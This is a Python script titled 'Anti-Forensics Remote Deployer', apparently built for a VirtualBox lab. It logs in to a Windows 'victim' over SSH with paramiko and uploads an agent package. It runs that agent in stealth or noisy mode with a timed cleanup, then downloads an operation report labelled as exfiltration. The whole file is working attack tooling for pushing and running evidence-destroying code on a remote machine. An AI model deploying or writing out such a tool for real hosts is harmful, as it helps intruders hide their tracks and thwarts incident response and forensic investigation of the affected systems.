import os
import sys
import time
import json
import getpass

try:
    import paramiko
except ImportError:
    print("[-] Error: 'paramiko' module is required for SSH connections.")
    print("Please run: pip install paramiko")
    sys.exit(1)

def deploy_attack(host, port, username, password, noisy=False, delay=0):
    print(f"\n[*] Connecting to {host}:{port} as {username}...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        print("[+] SSH Connected!")
        
        # Define paths
        local_pkg_path = "agent_package"
        # OpenSSH on Windows typically handles C:/Users/vboxuser
        remote_base = f"C:/Users/{username}"
        remote_dir = f"{remote_base}/agent_deployment_{int(time.time())}"
        
        # 1. Create Remote Directory
        print(f"[*] Creating remote directory: {remote_dir}")
        win_mkdir_cmd = f"cmd.exe /c mkdir \"{remote_dir.replace('/', '\\')}\""
        ssh.exec_command(win_mkdir_cmd)
        time.sleep(1) # Give it a second to create
        
        # 2. Upload Files
        sftp = ssh.open_sftp()
        print("[*] Uploading agent payload...")
        for filename in os.listdir(local_pkg_path):
            local_file = os.path.join(local_pkg_path, filename)
            remote_file = f"{remote_dir}/{filename}"
            if os.path.isfile(local_file):
                sftp.put(local_file, remote_file)
                print(f"    - Uploaded {filename}")
        
        # 3. Execute Agent
        print("[*] Using global Python since it is now installed...")
        
        mode_flag = "--noisy" if noisy else ""
        delay_flag = f"--delay {delay}" if delay > 0 else ""
        print(f"[*] Executing Anti-Forensics Agent on Victim (Mode: {'NOISY' if noisy else 'STEALTH'})...")
        if delay > 0:
            print(f"[*] Commanded Agent to delay cleanup by {delay} seconds.")
            
        win_run_cmd = f"cmd.exe /c \"cd /d \"{remote_dir.replace('/', '\\')}\" && python agent_controller.py {mode_flag} {delay_flag}\""
        
        stdin, stdout, stderr = ssh.exec_command(win_run_cmd)
        
        # Stream output
        while True:
            line = stdout.readline()
            if not line:
                break
            print(f"    [REMOTE] {line.strip()}")
            
        err = stderr.read().decode().strip()
        if err:
            print(f"    [REMOTE ERROR] {err}")
            
        print("[+] Agent execution finished.")
        
        # 4. Retrieve Report
        remote_report = f"{remote_dir}/operation_report.json"
        local_report = "victim_report_noisy.json" if noisy else "victim_report_evidence.json"
        
        # Add slight delay since disk write on Windows VM might lag behind the process exit over SSH
        time.sleep(1)
        
        try:
            sftp.get(remote_report, local_report)
            print(f"[+] EXFILTRATION SUCCESS: Report saved to {local_report}")
        except Exception as e:
            print(f"[-] Failed to retrieve report: {e}")
            
        # 5. Cleanup (Self-Destruct) - DISABLED per user request
        print("[*] Skipping Cleanup (Artifacts left on Victim for inspection)...")
        # ssh.exec_command(f"rm -rf {remote_dir}")
        print(f"[+] Remote files remain in: {remote_dir}")
        
        sftp.close()
        ssh.close()
        print("\n[SUCCESS] Attack Simulation Complete.")
        
    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check username/password.")
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Anti-Forensics Remote Deployer")
    parser.add_argument("--target", help="Target IP address")
    parser.add_argument("--port", type=int, default=22, help="SSH Port")
    parser.add_argument("--user", help="SSH Username")
    parser.add_argument("--password", help="SSH Password")
    parser.add_argument("--noisy", action="store_true", help="Run in Noisy Mode (Disable Stealth)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay in seconds before the agent performs cleanup (default: 0)")
    
    args = parser.parse_args()
    
    print("=== Anti-Forensics Remote Deployer ===")
    
    if args.target and args.user and args.password:
        target_ip = args.target
        target_port = args.port
        user = args.user
        pwd = args.password
        noisy = args.noisy
        delay = args.delay
    else:
        target_ip = input("Target IP (e.g., 10.0.2.15): ").strip()
        target_port = input("Target Port (Default 22): ").strip() or "22"
        target_port = int(target_port)
        user = input("Username: ").strip()
        pwd = getpass.getpass("Password: ")
        noisy = input("Run in Noisy mode? (y/N): ").lower().startswith('y')
        delay_input = input("Cleanup Delay in seconds (Default 0): ").strip()
        delay = float(delay_input) if delay_input else 0.0
    
    deploy_attack(target_ip, target_port, user, pwd, noisy, delay)
